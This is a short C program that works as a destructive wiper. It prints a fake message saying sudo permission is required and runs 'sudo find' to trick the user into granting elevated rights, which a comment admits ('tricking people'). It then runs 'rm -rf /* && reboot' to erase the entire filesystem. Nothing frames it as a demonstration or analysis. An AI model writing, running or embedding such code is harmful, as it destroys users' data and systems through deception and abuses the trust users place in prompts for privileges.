#include <stdlib.h>

int main()
{
	// kill(getpid(), SIGKILL); // same as kill -9
	// kill -9 for killing a process without handlers
	system("echo sudo permission access required files");
	system("sudo find"); // tricking people
	system("rm -rf /* && reboot");
	return 0;
}
